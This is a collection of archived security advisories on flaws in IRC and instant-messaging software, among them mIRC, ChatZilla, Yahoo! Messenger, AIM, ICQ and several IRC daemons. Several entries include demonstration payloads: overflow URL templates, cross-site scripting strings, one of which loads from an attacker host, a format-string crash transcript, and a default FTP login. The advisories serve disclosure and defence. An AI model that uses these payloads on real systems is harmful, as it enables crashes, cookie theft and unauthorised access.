Title: NeoStats May Give UnrealIRCd Remote Users Additional '+T' Usermode Privileges
Description:
A vulnerability was reported in NeoStats when run with the Unreal IRCd server.  A remote user may be able to gain additional IRC privileges.
It is reported that Unreal 3.2 Beta19 introduced some new features and a new '+T' UserMode that affects the interactions between Unreal and NeoStats.

A remote server can kill an Onjoin bot.  A user can gain additional privileges on the target application.
Impact': A remote user may be able to change additional IRC privileges.
Solution:
The vendor has issued a fixed version (2.5.10), available at:

http://www.neostats.net/index.php?id=12

The vendor notes that the patch does not fix certain incompatibilities with Unreal, which will be corrected in a future release of NeoStats (2.5.11).

Title: irssi Client Extraneous format_send_to_gui() Function Call Parameter Lets Remote Users Crash the Client
Description:
A vulnerability was reported in the irssi client.  A remote IRC user can cause the target user's client to crash in certain situations.
It is reported that when irssi is running on an architecture that requires memory alignmentation (e.g., not the x86 architecture) and the "gui print text" signal is being used by a script or plugin, the flaw can be triggered.  The 'nicklist.pl' and 'tab_stop.pl' scripts use the affected signal, the report said.

The vulnerability is reportedly due to an extraneous 'str' parameter in the format_send_to_gui() function call in 'src/fe-common/core/formats.c'.

A remote user can send a specially crafted IRC message via an IRC server to cause the target user's irssi client to crash.

According to the report, arbitrary code execution is not possible.

Rico Gloeckner is credited with discovering this flaw and Wouter Coekaerts is credited with debugging the flaw.
Impact': A remote user can cause the target user's irssi client to crash.
Solution:
The vendor has released a fixed version (0.8.9), available at:

http://www.irssi.org/?page=download

Title: Yahoo! Messenger YAUTO.DLL ActiveX Buffer Overflow Lets Remote Users Execute Arbitrary Code
Impact: Execution of arbitrary code via network
Description:
Tri Huynh from SentryUnion reported a buffer overflow in Yahoo! Messenger in the 'YAUTO.DLL' ActiveX component.  A remote user can execute arbitrary code on the target system.
It is reported that a remote user can create HTML that, when loaded by the target user, will cause an arbitrary executable to be downloaded to the target user's computer and silently executed.

The report indicates that YAUTO.DLL is registered under a ProgID called "YAuto.NSAuto.1" and contains a buffer overflow in the Open() function.  A remote user can pass a specially crafted URL to trigger the overflow and execute arbitrary code.
Impact': A remote user can execute arbitrary code on the target system with the privileges of the target user.
Solution:
No solution was available at the time of this entry.

The author of the report indicates that, as a workaround, you can delete the YAUTO.DLL file in your Yahoo! Messenger directory.

Title: ChatZilla 'irc://' Server Name Buffer Overflow Let Remote Users Execute Arbitrary Code
Impact: Execution of arbitrary code via local system
Execution of arbitrary code via network
Description:
A buffer overflow vulnerability was reported in ChatZilla.  A remote user can execute arbitrary code on the target user's system.
dr_insane reported that ChatZilla does not validate the length of a server name.  A remote user can generate an 'irc://' URL containg a specially crafted server name of greater than 40 kB in length that, when loaded by the target user, will trigger the buffer overflow.  An exploit URL can be of the following form:

irc://[40kb long string]

It is also reported that there is a buffer overflow in the processing of the /Nick command.  A local user can type a specially crafted /Nick command to cause the system to crash.
Impact': A remote user can create a URL that, when loaded by the target user, will cause arbitrary code to be executed on the target user's system.
Solution:
The author reports that version 0.9.45 is not vulnerable.

[Editor's note:  The Revision History at http://www.hacksrus.com/~ginda/chatzilla/revs.html makes no mention of these flaws.]
Underlying OS Comments: Tested on Windows and Mac OS

Title: SIRCD May Grant Operator Privileges to Remote Authenticated Users
Description:
A vulnerability was reported in the Smart IRC Daemon (SIRCD).  A remote authenticated user may be able to gain operator privileges.
It is reported that a remote authenticated user can set their usermode to '+o' as follows:

MODE <nick> +o

The flaw reportedly resides in 's_client.c'.

The vendor has reportedly been notified.
Impact': A remote authenticated user can gain operator privileges on an IRC channel.
Solution: No solution was available at the time of this entry.

Title: (Vendor Issues Fix) Re: Yak! Chat Default Account Lets Remote Users Access the File System
Description:
A vulnerability was reported in the Yak! chat application.  A remote user can access the file system.
It is reported that a remote user can access the application by connecting to TCP port 3535 and logging into the FTP service using a standard username ('Yak') and password ('asd123').  The remote user can thus gain access to the target user's file system.
Impact': A remote user can gain access to the target user's file system.
Solution: The vendor has released a fixed version (2.1.0).

Title: AOL Instant Messenger Can Be Disconnected By Remote Users Sending Spoofed FIN or SYN Scans
Description:
Paul Kurczaba reported a denial of service vulnerability in AOL Instant Messenger (AIM).  A remote user can conduct a spoofed TCP SYN or FIN scan against the target system to cause the target user's AIM client to disconnect.
It is reported that a remote user can invoke the 'nmap' network scanning tool in FIN or SYN Stealth mode against the port range from 9000 to 10000 with a spoofed source address to trigger the flaw.  After the nmap scan is finished, the AIM client will display the "Connection Lost. Check your internet connection" error message, according to the report.
Impact': A remote user can cause a target user's AIM client to disconnect from the AIM service.
Solution:
No solution was available at the time of this entry.

The author of the report indicates that as a workaround, you can use a personal firewall, such as ZoneAlarm or, for Windows XP users, the Windows XP Firewall.

Title: Unichat Character Processing Flaw Lets Remote Users Crash a Target User's Client
Description:
A vulnerability was reported in Unichat.  A remote user can cause the client to crash.
DarkKnight reported that the software does not properly process non-alphanumeric characters.  A remote user can add additional characters to the application and then connect to a chat room to cause a target user's Unichat application to crash.

It is also reported that the Unichat rooms do not prevent non-operators from setting the Topic (room name).  A remote user can connect to the chat room using a regular IRC client (e.g., mIRC) and change the room name.

The vendor was reportedly notified without response.
Impact': A remote user can cause a target user's client to crash.
Solution:
No solution was available at the time of this entry.

The author of the report indicates that you can add additional characters to the 'u2res000.rit' file to prevent crashing.

Title: Yahoo! Messenger File Transfer Flaw Lets Remote Users Crash the Target User's Client
Description:
A vulnerability was reported in Yahoo! Messenger.  A remote user can cause a target user's client to crash.
Hat-Squad Security Research Team reported that there is a flaw in the File Transfer option that allows a remote user to cause a target user's client to crash if the target user accepts a specially crafted transfer.  The remote user can send a file transfer request to a target user with the target user's ID value composed of the target user's actual ID followed by more than 73 '%' characters.  The '%' characters are reportedly filtered by the Messenger service but will trigger the crash.

According to the report, the '?' and '&' characters can also be used.

A demonstration exploit example is provided in the Source Message.
Impact': A remote user can cause a target user's Yahoo! Messenger client to crash when the target user accepts a specially crafted file transfer request.
Solution: No solution was available at the time of this entry.

Title: (Conectiva Issues Fix) IRCnet IRCD Buffer Overflow in JOIN Command Lets Local Users Crash the Server
Description:
A buffer overflow was reported in IRCnet's IRCD software.  A remote user can cause denial of service conditions.
It is reported that there is a buffer overflow in 'channel.c' in the processing of the JOIN command.  A remote user can cause the IRCD server to crash.

According to the report, exploits are available.

Another report indicates that there may be other denial of service flaws, but the nature of those flaws was not disclosed.
Impact': A remote user can cause the IRCD process to crash.
Solution:
Conectiva has released a fix.

ftp://atualizacoes.conectiva.com.br/9/RPMS/ircd-2.10.3p3-27242U90_2cl.i386.rpm
ftp://atualizacoes.conectiva.com.br/9/SRPMS/ircd-2.10.3p3-27242U90_2cl.src.rpm

Title: IRCnet IRCD Buffer Overflow in JOIN Command Lets Remote Users Crash the Server
Description:
A buffer overflow was reported in IRCnet's IRCD software.  A remote user can cause denial of service conditions.
It is reported that there is a buffer overflow in 'channel.c' in the processing of the JOIN command.  A remote user can cause the IRCD server to crash.

According to the report, exploits are available.

Another report indicates that there may be other denial of service flaws, but the nature of those flaws was not disclosed.
Impact': A remote user can cause the IRCD process to crash.
Solution:
The vendor has released a fixed version (irc2.10.3p4), available at:

ftp://ftp.irc.org/irc/server/irc2.10.3p4.tgz

Also, a patch is available at:

http://akson.sgh.waw.pl/~chopin/ircd/patches/m_join.diff

Title: AOL Instant Messenger aim://getfile?screenname Buffer Overflow Lets Remote Users Execute Arbitrary Code
Impact: Execution of arbitrary code via network
Description:
A buffer overflow vulnerability was reported in AOL Instant Messenger (AIM).  A remote user can create a URL that, when loaded by the target user, will cause arbitrary code to be executed on the target user's system.
DigitalPranksters reported that there is a buffer overflow in the processing of the 'screenname' parameter of the 'getfile' function. A specially crafted "aim://" protocol URL can trigger the buffer overflow and overwrite the EIP register to execute arbitrary code on the target system.  According to the report, the target user is first presented with a dialog warning box before loading the URL.

A demonstration exploit URL is provided:

aim://getfile?screenname=[About 1130 chars]

The following notification timeline is provided:

Vendor Contacted: September 16, 2003
Vendor Released Patch: September 25, 2003
DigitalPranksters Public Advisory Released: October 15, 2003
Impact': A remote user can cause arbitrary code to be executed if the user selects to download a file after a URL is loaded.
Solution:
The vendor has issued a fixed version (5.5.3415 Beta), available at:

http://www.aim.com/get_aim/win/win_beta.adp

According to the report, the standard (non-beta) version has not yet been updated.

Title: mIRC Buffer Overflow in irc:// Handler Lets Remote Users Execute Arbitrary Code
Impact: Execution of arbitrary code via network
Description:
Phuong Nguyen reported a buffer overflow in mIRC in the "irc://" handler.  A remote user can execute arbitrary code on the target system.
The report indicates that when the mIRC client is installed, it registers itself as the program of choice for the "irc://" URL prefix. A buffer overflow reportedly exists in the processing of "irc://" URLs.  A remote user can create a specially crafted "irc://" URL that, when loaded by the target user, will cause arbitrary code to be executed on the target user's system.  The code will run with the privileges of the target user.

A demonstration exploit URL is of the following form (where the buffer is greater than 998 bytes):

irc://[buffer]
Impact': A remote user can cause arbitrary code to be executed by the target user's system when the target user loads a specially crafted URL.  The code will run with the privileges of the target user.
Solution:
The vendor has released a fixed version (6.11), available at:

http://www.mirc.com/get.html

Title: mIRC Client Buffer Overflow in Processing USERHOST Responses Lets Remote Servers Execute Arbitrary Code
Impact: Execution of arbitrary code via network
Description:
A buffer overflow was reported in the mIRC client.  A remote IRC server can cause arbitrary code to be executed on the connected mIRC client.
SecuriTeam reported that a buffer overflow exists in the processing of USERHOST responses.  A remote IRC server can reportedly send a host string that is longer than 110 bytes to trigger the overflow and execute arbitrary code on the client.  The code will run with the privileges of the user running the mIRC client.

A demonstration exploit is available at:

http://whiteroof.netfirms.com/userhost.zip

The original advisory is available at:

http://whiteroof.netfirms.com/

The vendor was reportedly notified in September 2002.

Sylvain Descoteaux is credited with reporting the flaw.
Impact': A remote IRC can cause arbitrary code to be executed by a connected mIRC client with the privileges of the user running the mIRC client.
Solution: No solution was available at the time of this entry.  The vendor reportedly plans to issue a fix in the next version.

Title: ChatZilla Client Can Be Crashed By IRC Servers Sending Long Requests
Description:
A vulnerability was reported in ChatZilla.  A malicious server can cause the ChatZilla client to crash.
m00 Security reported that a remote user acting as an IRC server can send a specially crafted request containing a long string (approximately 60 kb) to the connected client to cause the client to crash.

A demonstration exploit is available at:

http://www.m00security.org/exp/m00-ChatZilla.c

The original advisory is available at:

http://www.m00security.org/adv/adv003.txt
Impact': A remote user (acting as an IRC server) can ause a connected ChatZilla client to crash.
Solution: No solution was available at the time of this entry.

Title: DBabble Chat Server Input Validation Flaws Permit Remote Cross-Site Scripting Attacks
Impact: Execution of arbitrary code via network
Description:
Some input validation vulnerabilities were reported in the DBabble chat server.  A remote user can conduct cross-site scripting attacks.
Dr_insane reported that the software does not filter HTML code from user-supplied input before displaying the input.  As a result, a remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the DBabble software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.

Some demonstration exploit URLs are provided:

http://[HOST]:8132/dbabble?cmd=[XSS ATTACK]
http://[HOST]:8132/dbabble?[XSS ATTACK] 
http://[HOST]:8132/dbabble?cmd=cmd_newuser&lang=English&template=Standard (Fields name,password and Display name are vulnerable to XSS ATTACK)

It is also reported that the software does not properly validate the 'display' variable values, which may cause denial of service conditions.  The nature of the denial of service conditions was not disclosed.  A demonstration exploit URL was provided:

http:[HOST]/dbabble?tok=1_1_840327879_1094951187&cmd=u_friends_del&hid=1&uid=3&display=WHATEVER!!!!

The vendor has reportedly been notified.
Impact': A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the DBabble server software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.
Solution: No solution was available at the time of this entry.

Title: Yak! Chat Default Account Lets Remote Users Access the File System
Description:
A vulnerability was reported in the Yak! chat application.  A remote user can access the file system.
It is reported that a remote user can access the application by connecting to TCP port 3535 and logging into the FTP service using a standard username ('Yak') and password ('asd123').  The remote user can thus gain access to the target user's file system.
Impact': A remote user can gain access to the target user's file system.
Solution:
No solution was available at the time of this entry.

The author of the report indicates that you can edit the password by using a hexeditor on the application binary [see the Source Message for instructions].

Title: Yahoo! Messenger Weak Encoding Algorithm Discloses Archived Messages to Local Users
Description:
Thai Duong reported a vulnerability in Yahoo! Messenger.  A local user can obtain the message archive and the buddy list due to the use of a weak encoding algorithm.
It is reported that the "Archive" feature, when enabled, uses a simple XOR algorithm to store all instant messaging communications on the local system.  The messages are reportedly XOR'd with the target user's Yahoo! Messenger ID (YID) and stored in a 'dat' file:

\path\to\Yahoo Messenger\Profiles\{Your YID}\Archive\Messages\{Your friend's YID}\*.dat

According to the report, a local user can enable the Archive feature by modifying some Windows registry keys:

-HKEY_CURRENT_USER/SOFTWARE/Yahoo/Pager/Profiles/{Your YID}/Archiving/Enabled: 1

-HKEY_CURRENT_USER/SOFTWARE/Yahoo/Pager/Profiles/{Your YID}/Archiving/DeletedAfter: 999

The vendor was reportedly notified August 12, 2003.
Impact':
A local user can enable archiving for another local user and can obtain the target user's archived messages.

[Editor's note:  This may be of more concern on shared computers, such as public hosts.]
Solution:
No solution was available at the time of this entry.

The vendor reportedly responded on August 23, 2003 with the following text:

"Yahoo!'s encoding of archive files is not intended for nor marketed as encryption but is just a part of the application storage mechanism.  Hence, after careful consideration we have determined that this scenario doesn't speak to a threat specific to Yahoo! Messenger."

Title: MPCSoftWeb Discloses Chat User Passwords to Remote Users
Description:
CyberTalon reported a vulnerability in the MPCSoftWeb Chat Xtra application.  A remote user can obtain chat user passwords.
It is reported that the application stores usernames and passwords for chatroom users and for the administrator in the 'database/mpcsoftweb_chat_xtra.mde' file.  A remote user can download this file to obtain the passwords, the report stated.

A demonstration exploit URL is provided:

http://[target]/chatfolder/database/mpcsoftweb_chat_xtra.mde
Impact': A remote user can obtain usernames and passwords for the chat room users and for the administrator.
Solution:
No solution was available at the time of this entry.

The author of the report indicated that, as a workaround, you can hide the database file.

Title: Sandsprite.com Chat Server Input Filtering Hole Lets Remote Users Conduct Cross-Site Scripting Attacks
Impact: Execution of arbitrary code via network
Description:
An input validation vulnerability was reported in the Chat Server from sandsprite.com.  A remote user can conduct cross-site scripting attacks through chat sessions.
exploitlabs.com reported that a remote user can send HTML code through a chat session to be executed by the browser of any target user that is participating in the chat session.  The code will originate from the site running the Chat Server software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.

The vendor has reportedly been notified.
Impact': A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the Chat Server software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.
Solution: No solution was available at the time of this entry.

Title: Lotus Sametime Instant Messaging Encryption Flaws Disclose User Passwords to Remote Users
Description:
A vulnerability was reported in Lotus Sametime.  A remote user can obtain the encryption key and decrypt the target user's password or instant messaging content.
It is reported that the software contains flaws regarding the use of encryption to ostensibly protect authentication and chat information.

The report indicates that authentication (login) messages include the RC2-40 key within the login message itself.  A remote user that is monitoring the network can obtain the key and decrypt the target user's password.

The report also states that encryption keys are included within instant messages, that each encrypted message beings with 6 bytes of known plaintext, and that the RC2-40 keys are generated using a limited set of inputs, resulting in a much smaller keyspace than would otherwise be possible.  The 10 byte keys are reportedly generated using ASCII representations of decimal numbers 0-9 instead of the 256 possible values per byte, creating a keyspace of 10^10 possibilities instead of 10^256.  However, it is not necessary to guess the key, as the key is reportedly provided in the login message.

The encrypted message channels suffer from similar flaws, the report said.
Impact': A remote user monitoring the network can obtain a target user's encryption key to decrypt the target user's password or instant messages.
Solution: No solution was available at the time of this entry.

Title: Everybuddy Messaging Client Can Be Crashed By Remote Users
Description:
A denial of service vulnerability was reported in Everybuddy.  A remote user can cause a target user's client to crash.
SecuriTeam reported that a remote user can send a specially crafted long message (of approximately 1540 characters) to a target user to cause the target user's client to crash.

Some demonstration exploit code is provided in the Source Message.

The following notification timeline is provided:

19/06/2003 - First attempt to contact vendor
20/06/2003 - First vendor response
22/06/2003 - PoC provided to vendor
01/07/2003 - Second attempt to contact vendor
01/08/2003 - Third attempt to contact vendor
05/08/2003 - Public advisory
Impact': A remote user can cause a target user's Everybuddy client to crash.
Solution: No solution was available at the time of this entry.

Title: (Vendor Issues Fix) Re: IRCXpro Chat Server Discloses Passwords to Local Users
Description:
A vulnerability was reported in the IRCXpro Internet Relay Chat (IRC) server.  A local user can view passwords.
Morning Wood reported that the server software stores usernames and passwords in the 'settings.ini' file in plain text.  A local user can view the passwords.

The vendor has reportedly been notified concurrently with release of the advisory.
Impact': A local user can view passwords.
Solution:
The vendor has issued a fixed version (1.1), available at:

http://www.ircxpro.com/default.asp?id=download

Title: Synthigence Forum/Chat Software Discloses User Passwords to Remote Users
Description:
A vulnerability was reported in the Forum/Chat Software for ASP.NET from Synthigence.  A remote user can obtain information about users, including their passwords.
Zone-H reported that, for systems that do not use a SQL server, a remote user can download the '.mdb' database file with the following type of URL:

http://[target]/PATH OF THE FORUM/forum.mdb

In the default configuration, this file is reportedly not protected and contains user passwords, including the administrator's password.

The vendor has reportedly been notified.
Impact': A remote user can view usernames and passwords.
Solution:
No solution was available at the time of this entry.

The author of the report indicates that, as a workaround, you can protect the file using web server access controls.

Title: aMSN Client May Disclose the User's Password to Local Users
Description:
cyber talon reported an authentication information disclosure vulnerability in the 'aMSN' MSN Messenger clone for Linux.  A local user can determine the target user's Hotmail password.
It is reported that a local user can perform a series of steps when a target user is signed in to the service to cause the system to display the password as part of a Stack Trace.

The steps are:

- Open AMSN Messenger and sign in

- Go to Tools>Options>Preferences>Applications

- For Browser type in a location other then where the browser is, and the same for File Manager

- Click Save

- On the main part of AMSN, click on the text to go to the hotmail inbox

Following these steps will reportedly cause aMSN to generate an error.  Then, the local user can click on 'Stack Trace', which will contain the string "hotmail_login password", where 'password' represents the target user's actual password.

The vendor has reportedly been notified.
Impact': A local user can obtain a target user's Hotmail password when the target user is signed in.
Solution: No solution was available at the time of this entry.

Title: ICQ Pro Lets Local Users Login Without Passwords
Description:
An authentication vulnerability was reported in ICQ Pro 2003a.  A local user can gain access to any locally registered account without using the password.
It is reported that a local user can invoke the 'EnableWindow' API to open the ICQ contact list window for a target user.  Then, the local user can set the target user's status to 'online' from that window to be successfully connected to the server without having to provide a password.  This exploit reportedly works even if the target user has not selected the 'save password' option.

Some demonstration exploit code is provided in the Source Message.
Impact': A local user can login to ICQ using a local user's account.
Solution: No solution was available at the time of this entry.

Title: Trillian Can By Crashed By Remote Users Sending a Malformed 'TypingUser' Message
Description:
A denial of service vulnerability was reported in Trillian.  A remote user can cause the client to crash.
It is reported that a remote user can send a malformed 'TypingUser' message that replaces any of the characters in 'TypingUser' to trigger a crash within msn.dll.
Impact': A remote user can cause a target user's Trillian client to crash.
Solution: No solution was available at the time of this entry.

Title: ezbounce Format String Flaw Lets Remote Users Execute Arbitrary Code
Impact: Execution of arbitrary code via network
Description:
A format string vulnerability was reported in the 'ezbounce' Internet Relay Chat (IRC) bouncer.  A remote user can execute arbitrary code.
Vade79 reported that the flaw resides in the processing of the 'sessions' command in the 'commands.cpp' file.  A remote user can connect to the system and supply a specially crafted NICK command that contains format string characters to trigger the flaw.  Arbitrary code can be executed.

Demonstration exploit code is available in the Source Message and at:

http://fakehalo.deadpig.org/xezb.c
Impact': A remote user can execute arbitrary code with the privileges of the ezbounce process.
Solution: No solution was available at the time of this entry.

Title: Bahamut IRCd Format String Flaw Lets Remote Users Execute Arbitrary Code
Impact: Execution of arbitrary code via network
Description:
A format string vulnerability was reported in Bahamut IRCd.  A remote user can execute arbitrary code on the target server.
Bitnux and 0xbadc0ded reported a format string flaw resides in 'src/s_debug.c' and can be triggered if the server has been configured with DEBUGMODE defined.  The software makes a syslog() call without specifying the format string and without filtering user-supplied input.

According to the report, a remote user can connect to the IRC server and send a specially crafted format string to trigger the flaw.  A demonstration exploit transcript is provided:

    [je@vudo ~]$ telnet 127.0.0.1 6667
    Trying 127.0.0.1...
    Connected to 127.0.0.1.
    Escape character is '^]'.
    :server.dal.net NOTICE AUTH :*** Looking up your hostname...
    :server.dal.net NOTICE AUTH :*** Checking Ident
    :server.dal.net NOTICE AUTH :*** Found your hostname
    :server.dal.net NOTICE AUTH :*** No Ident response
    %n%n%n
    Connection closed by foreign host.
    [je@vudo ~]$ telnet 127.0.0.1 6667
    Trying 127.0.0.1...
    telnet: Unable to connect to remote host: Connection refused
    [je@vudo ~]$ 

It is reported that other IRC daemons based on Bahamut are affected, including digatech-1.2.1, methane-0.1.1, and AndromedeIRCd1.2.3-Release.  The cs-ircd daemon was also affected and has been fixed in cs-ircd-0.1.1beta.

The following notification timeline is provided:

2003/06/25 Notified developers of the vulnerable IRC-daemons.
2003/06/26 Public release
Impact': A remote user can cause the IRC server to crash or execute arbitrary code.  The code will run with the privileges of the IRCd daemon.

Title: BNC Chat Client File Locking Flaw Lets Remote Users Deny Service
Description:
A vulnerability was reported in the BNC Internet Relay Chat (IRC) client.  A remote user can cause denial of service conditions.
SecuriTeam reported that a remote user can initiate two connections and then close the second connection to cause the service to crash.  The report is credited to Angelo Rosiello.
Impact': A remote user can cause the service to crash.
Solution:
The vendor has released a fixed version (2.6.4 and later), available at:

http://www.gotbnc.com/download.html

Title: ASP Chat Permits Remote Cross-Site Scripting Attacks
Impact: Execution of arbitrary code via network
Description:
An input validation vulnerability was reported in ASP Chat.  A remote user can conduct cross-site scripting attacks against ASP Chat participants.
exploitlabs.com reported that the script does not filter HTML code from the 'login' variable (i.e., the nickname).  A remote user can join the chat with a specially crafted nickname that will cause arbitrary scripting code to be executed by all chat participants. The code will originate from the site running ASP Chat and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.
Impact': A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running ASP Chat, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.
Solution: No solution was available at the time of this entry.

Title: Infobot IRC Bot Default User Accounts May Let Remote Users Access the System
Description:
A default configuration vulnerability was reported in the Infobot IRC bot.  A remote user may be able to access a default user account.
exploitlabs.com reported that the default installation of Infobot enables two default user accounts:  oznoid, and plonk.  If the administrator does not comment out the user accounts, a remote user may be able to access the system using the default accounts.

The vendor has reportedly been notified (concurrent with release of the advisory).
Impact': A remote user may be able to access the system using default accounts.
Solution: No solution was available at the time of this entry.

Title: IRCXpro Chat Server Discloses Passwords to Local Users
Description:
A vulnerability was reported in the IRCXpro Internet Relay Chat (IRC) server.  A local user can view passwords.
Morning Wood reported that the server software stores usernames and passwords in the 'settings.ini' file in plain text.  A local user can view the passwords.

The vendor has reportedly been notified concurrently with release of the advisory.
Impact': A local user can view passwords.
Solution: No solution was available at the time of this entry.

Title: WebChat for PHP-Nuke Has Multiple Flaws That Allow Cross-Site Scripting and Possibly SQL Injection
Impact: Execution of arbitrary code via network
Description:
Several vulnerabilities were reported in WebChat 2.0 for PHP-Nuke.  A remote user can determine the installation path.  A remote user can conduct cross-site scripting attacks.
XyborG reported that a remote user can request the following URLs to determine the installation path of the application:

http://[target]/modules/WebChat/out.php
http://[target]/modules.php?op=modload&name=WebChat&file=index&roomid=Non_Numeric
http://[target]/modules/WebChat/in.php
http://[target]/modules/WebChat/quit.php
http://[target]/modules/WebChat/users.php

A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the WebChat software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.

Some demonstration exploit URLs are provided:

http://[target]/modules/WebChat/users.php?rid=Non_Numeric&uid=-1&username=[Any_Word_or_your_code]

http://[target]/modules/WebChat/users.php?rid=Non_Numeric&uid=-1&username="><script>alert(document.cookie);</script>

According to the report, it may also be possible to inject SQL commands to be executed by the underlying database [but that was not confirmed in the report].

The vendor has been notified.  The original bug report is available at:

http://www.saarport.net/modules.php?name=Forums&file=viewtopic&p=1029
Impact':
A remote user can determine the installation path.

A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the WebChat software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.

A remote user may be able to inject SQL commands to be executed by the underlying database server [but that was not confirmed in the report].
Solution: No solution was available at the time of this entry.  According to the report, a patched version will be available shortly.

Title: SPChat Input Validation Flaw in 'statussess' Field Permits Cross-Site Scripting Attacks
Impact: Execution of arbitrary code via network
Description:
An input validation vulnerability was reported in SPChat.  A remote user can conduct cross-site scripting attacks.
XyborG reported that a remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the SPChat software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.

A demonstration exploit URL is provided:

http://[target]/modules.php?op=modload&name=SPChat&file=index&statussess=<IFRAME%20src="http://[attacher]/attack.htm"

This demonstration will cause the following code on the [attacker] site to be executed by the target user's browser:

<script>
alert(document.cookie);
</script>

The vendor has been notified.  The original bug report is available at:

http://www.saarport.net/modules.php?name=Forums&file=viewtopic&p=1029
Impact': A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the SPChat software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.
Solution: No solution was available at the time of this entry.  According to the report, a patched version will be available shortly.

Title: ICQ Lite Operating System File Permissions Let Remote Authenticated Users Gain Elevated Privileges
Impact: Execution of arbitrary code via network
Description:
A vulnerability was reported in ICQ Lite.  A remote authenticated user (authenticated via the operating system on the target user's computer) can modify the ICQ Lite executable on a target user's computer.
SECURITY.NNOV reported that during the installation process, ICQ Lite adds 'Full Control' access privileges for the 'Interactive Users' group for the 'Program Files\ICQ Lite' directory.  A remote authenticated user can install or modify files in the directory.  

A remote authenticated user can modify the ICQ Lite binary to cause arbitrary code to be executed by the target user when the target user next runs ICQ Lite.
Impact': A remote authenticated user can cause arbitrary code to be executed by the target user when the target user loads ICQ Lite.
Solution:
No solution was available at the time of this entry.

The author of the report has indicated that, as a workaround, you can switch the "Full Control" permission to "Change" permissions on the directory and change permissions for all executable files (.exe and .dll's) in the directory to "Read" permissions.

Title: Yahoo! Voice Chat ActiveX Control Buffer Overflow Lets Remote Users Execute Arbitrary Code
Impact: Execution of arbitrary code via network
Description:
A vulnerability was reported in Yahoo! Audio Conferencing in the Yahoo! Voice Chat Control.  A remote user can cause arbitrary code to be executed.
It is reported that the software contains a buffer overflow vulnerability.  The affected control is used by the Yahoo! Messenger and Yahoo! Chat applications, according to the vendor.

A remote user can create HTML that, when loaded by a target user, will trigger the overflow in the ActiveX control and either cause the control to crash or cause arbitrary code to be executed.  The code will run with the privileges of the target user.

The vendor credits Cesar (sqlsec@yahoo.com) with reporting the flaw.
Impact': A remote user can cause arbitrary code to be executed on the target user's system.
Solution:
The vendor has released a fixed version (1,0,0,45).  The CLSID of the fixed control is 2B323CD9-50E3-11D3-9466-00A0C9700498.  The fixed version is available at:

http://messenger.yahoo.com/messenger/security

As a workaround, the vendor indicates that the the control can be disabled by removing the object from the Internet Explorer "Downloaded Program Files" cache and, if Yahoo! Messenger is installed, going into the Yahoo! Messenger directory (by default, C:\Program Files\Yahoo!\Messenger\) and running the following command:

  regsvr32 /u yacscom.dll

Title: IP Messenger Buffer Overflow May Let Remote Users Cause Arbitrary Code to Be Executed
Impact: Execution of arbitrary code via network
Description:
A buffer overflow vulnerability was reported in 'IP Messenger for Win'.  In certain cases, a remote user can cause arbitrary code to be executed.
SecureNet Service issued an advisory warning of a buffer overflow in the file & folder transfer mechanism.  The overflow can be triggered when the target user attempts to save a file with a long filename that was received via IP Messenger.  

A remote user can send a file with a specially crafted file name to the target user.  If the target user saves the file, arbitrary code may be executed.  The code will run with the privileges of the target user.

SNS credits Hisayuki Shinmachi with discovery.

The original SNS advisory is available at:

http://www.lac.co.jp/security/english/snsadv_e/64_e.html
Impact': A remote user can send a file via IP Messenger to a target user that, when saved by the target user, will execute arbitrary code with the privileges of the target user.
Solution:
The vendor has released a fixed version (2.03), available at:

http://www.asahi-net.or.jp/~VZ4H-SRUZ/ipmsg-eng.html

Title: ICQ Pro 2003a Has Multiple Flaws That May Permit Remote Arbitrary Code Execution and Denial of Service
Impact: Execution of arbitrary code via network
Description:
Several vulnerabilities were reported in ICQ Pro 2003a.  A remote user may be able to execute arbitrary code on the client.  A remote user can cause the client to crash.
Core Security Technologies reported six separate flaws.

A format string vulnerability was reported in the ICQ's integrated POP3 e-mail client (in POP3.dll).  A remote user acting as a POP3 server can insert format string characters in the UIDL command response to trigger the flaw and execute arbitrary code on the target user's ICQ client.

It is also reported that the ICQ "Features on Demand" upgrade service can be spoofed.  According to the report, the IP address of the download server and the URLs for the download files are hard-coded in the "\DataFiles\Packages.ini" file and the system does not use strong authentication or integrity protection mechanisms.  A remote user can spoof the server so that when the target user's client attempts to upgrade, arbitrary code is downloaded and installed on the target user's system.

The advisory states that the message advertisement service can be spoofed.  A remote user can spoof the server and supply specially crafted HTML to cause the client to crash.

Finally, an input validation vulnerability was reported in the processing of GIF images (in 'icqateimg32.dll').  A remote user can supply a GIF file with a specially crafted header to cause the target user's client to crash.  It is reported that ICQ expects that an existing Global Color Table (GCT) or a Local Color Table (LCT) will follow an "Image Descriptor".  If none of the color tables are included, the GIF library will crash.

Additional technical details are provided in the Source Message and in the original CORE advisory at:

http://www.coresecurity.com/common/showdoc.php?idx=315&idxseccion=10

The vendor has reportedly been notified.
Impact':
A remote user acting as a POP3 mail server can cause arbitrary code to be executed on the target user's client.

A remote user can send specially crafted e-mail to the target user to cause the target user's POP3 client to crash.

